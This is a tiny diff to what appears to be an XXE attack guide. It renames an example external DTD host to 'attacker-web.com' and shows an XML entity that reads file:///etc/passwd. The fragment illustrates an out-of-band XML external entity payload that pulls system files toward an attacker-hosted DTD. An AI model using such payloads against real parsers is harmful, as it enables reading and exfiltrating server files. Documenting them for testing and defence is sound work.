@@ -188,7 +188,7 @@ Example:
 ```
 
 **EXAMPLE 3**
-- Code from http://web-atacante.com/cositas.dtd
+- Code from http://attacker-web.com/cositas.dtd
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
